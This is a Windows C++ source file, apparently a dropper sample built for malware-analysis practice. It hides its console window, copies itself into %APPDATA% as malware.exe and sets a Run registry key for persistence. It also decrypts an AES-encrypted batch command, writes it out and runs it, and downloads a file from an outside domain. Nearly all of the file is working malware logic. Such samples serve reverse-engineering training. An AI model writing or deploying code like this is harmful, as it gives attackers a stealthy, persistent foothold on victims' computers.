// Day2Dynamic.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <Shlobj.h>

#include <urlmon.h>

#pragma comment(lib, "urlmon.lib")

#define AES_KEY_SIZE 16
#define CHUNK_SIZE (AES_KEY_SIZE*3)

int main()
{


   //variables
    CHAR szDropPath[MAX_PATH]; // Drop Folder location in appdata .ie xyz
    CHAR szCommandPath[MAX_PATH]; // full path of command.bat
    CHAR szMalwarePath[MAX_PATH]; // full path of malware.exe
    CHAR szExecutionFilePath[MAX_PATH]; // full execution file path
    CHAR szCurrentDirPath[MAX_PATH]; // current execution directory path

    //hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    //get appdata path
    if (!(SHGetSpecialFolderPathA(NULL, szDropPath, CSIDL_APPDATA, 1)))
    {
        MessageBoxA(nullptr, "Error getting appdata folder!", "Error", MB_OK);
        exit(1);
    }

    //combine path 
    strcat_s(szDropPath, "\\xyz");
    strcpy_s(szCommandPath, szDropPath);
    strcpy_s(szMalwarePath, szDropPath);
    strcat_s(szCommandPath, "\\command.bat");
    strcat_s(szMalwarePath, "\\malware.exe");

    //create a folder xyz in %appdata%
    if (!CreateDirectoryA(szDropPath, NULL)) 
    {
        DWORD ERROR_CODE;
        ERROR_CODE = GetLastError();
        if (ERROR_CODE != ERROR_ALREADY_EXISTS) 
        {
            MessageBoxA(
                NULL,
                "Error creating appdata folder!",
                "Error", MB_OK
            );

            exit(1);
        }
    }
    
    //Get Current execution file and folder path 
    GetCurrentDirectoryA(MAX_PATH, szCurrentDirPath);

    if (not GetModuleFileNameA(
        NULL,
        szExecutionFilePath,
        MAX_PATH
    )) 
    {
        MessageBoxA(nullptr, "Failed to get Module Path", "Error", MB_OK);
    }


    // check if running from appdata
    if (strcmp(szCurrentDirPath, szDropPath) == 0) 
    {
        //Drop Registry entry for persistence

        HKEY key;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
        {

            LONG lRet = RegQueryValueExA(key, "Malware", 0, NULL, NULL, NULL);
            if (lRet == ERROR_FILE_NOT_FOUND)
            {
                if (RegSetValueExA(key, "Malware", 0, REG_SZ, (CONST BYTE*)szMalwarePath, strlen(szMalwarePath)) != ERROR_SUCCESS)
                {
                    MessageBoxA(nullptr, "Failed RegSetValueEx", "Error", MB_OK);
                }
            }

            
            else if (lRet == 0)
            {
                ;
            }

            else 
            {
                MessageBoxA(nullptr, "Failed RegOpenKeyEx", "Error", MB_OK);
            }

            RegCloseKey(key);
        }
        else {
            MessageBoxA(nullptr, "Failed RegQueryValueExA", "Error", MB_OK);
        }


        //Download File

        

        TCHAR url[] = L"http://xyzdomain.com/dictionary.txt";

        TCHAR path[MAX_PATH];

        GetCurrentDirectory(MAX_PATH, path);

        //strcat_s(szCurrentDirPath, "\\dictionary.txt");
        wsprintf(path, L"%s\\index.html", path);

        //printf("Path: %S\n", path);

        HRESULT res = URLDownloadToFile(NULL, url, path, 0, NULL);

        if (res == S_OK) {
            MessageBoxA(nullptr, "You cracked IT. :) ", "Message", MB_OK); ;
        }
        else if (res == E_OUTOFMEMORY) {
            MessageBoxA(nullptr, "Invalide Buffer lenght for download file", "Error", MB_OK);
        }
        else if (res == INET_E_DOWNLOAD_FAILURE) {
            ;
        }
        else {
            MessageBoxA(nullptr, "Failed to download file.", "Error", MB_OK);
        }

    }

    else 
    {
        // Drop a self copy to xyz

        if (!CopyFileA(szExecutionFilePath, szMalwarePath, FALSE))
        {
            DWORD ERROR_CODE;
            ERROR_CODE = GetLastError();
            if (ERROR_CODE != ERROR_ACCESS_DENIED)
            {
                MessageBoxA(nullptr, "CopyFile Failed", "Error", MB_OK);

                exit(1);
            }
         
        }

        //decrypt the buffer
        CHAR szKey[] = "Thisiskeytoencrypt";

        //stores command in encrypted form
        BYTE szCommand[] = { 0x87,0x12,0xd2,0x6f,0xd7,0x62,0x62,0xb7,0x41,0x36,0xe6,0x21,0xf4,0xbe,0x9e,0x69,0xdc,0x39,0x9c,0x42,0x02,0x6e,0x96,0xc3,0x63,0xdc,0xb6,0x48,0x74,0x3a,0x69,0x4f,0xcc,0xc9,0xcb,0xb8,0x79,0xeb,0x5c,0x92,0xee,0x34,0xd7,0x3b,0x40,0xc2,0x88,0xd4 };

        //BYTE szToEncrypt[] = { 0x40,0x65,0x63,0x68,0x6F,0x20,0x6F,0x66,0x66,0x20,0x26,0x26,0x20,0x63,0x64,0x20,0x22,0x25,0x7E,0x64,0x70,0x30,0x22,0x20,0x26,0x26,0x20,0x6D,0x61,0x6C,0x77,0x61,0x72,0x65,0x2E,0x65,0x78,0x65,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };

        //encryption process start
        HCRYPTPROV hProv;
        CHAR info[] = "Microsoft Enhanced RSA and AES Cryptographic Provider";
        if (!CryptAcquireContextA(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            MessageBoxA(nullptr, "CryptAcquireContextA Failed", "Error", MB_OK);
            system("pause");
        }
        HCRYPTHASH hHash;
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            MessageBoxA(nullptr, "CryptCreateHash Failed", "Error", MB_OK);
            system("pause");
        }

        if (!CryptHashData(hHash, (BYTE*)szKey, 18, 0)) {
            MessageBoxA(nullptr, "CryptHashData Failed", "Error", MB_OK);
            system("pause");
        }


        HCRYPTKEY hKey;
        if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
            MessageBoxA(nullptr, "CryptDeriveKey Failed", "Error", MB_OK);
            system("pause");
        }

      
        DWORD out_len = 38;
        BOOL isFinal = TRUE;


       /* if (!CryptEncrypt(hKey, NULL, isFinal, 0, szToEncrypt, &out_len, 48)) {
           
            DWORD ERROR_D;
            ERROR_D = GetLastError();
            printf("[-] cryptencrypt failed\n");
        }*/
        

        out_len = 48;
        if (!CryptDecrypt(hKey, NULL, isFinal, 0, szCommand, &out_len))
        {
            DWORD ERROR_D;
            ERROR_D = GetLastError();
            MessageBoxA(nullptr, "CryptDecrypt Failed", "Error", MB_OK);
            exit(0);
        }
       

        //save decrypted data
        HANDLE hHandle;
        hHandle = CreateFileA(szCommandPath, GENERIC_WRITE, NULL, NULL, 2, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hHandle == INVALID_HANDLE_VALUE) {
            MessageBoxA(nullptr, "CreateFileA Failed", "Error", MB_OK);
        }
        DWORD dwNumberofbytes = 0;
        if (!WriteFile(hHandle, szCommand, 38, &dwNumberofbytes, NULL)) {
            MessageBoxA(nullptr, "WriteFile Failed", "Error", MB_OK);
        }

        CloseHandle(hHandle);
        
        
        //launch the self copy process
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        CHAR szCommandLine[MAX_PATH+50] = "C:\\Windows\\System32\\cmd.exe /C ";
        strcat_s(szCommandLine, szCommandPath);

        if (!CreateProcessA(NULL, szCommandLine, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
        {
            MessageBoxA(nullptr, "CreateProcessA Failed", "Error", MB_OK);
        }

        
        //HINSTANCE hReturnCode = ShellExecuteA(NULL, "open", "C:\\Users\\User\\AppData\\Roaming\\xyz\\command.bat", NULL, NULL, SW_HIDE);

        exit(0);
    }

}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
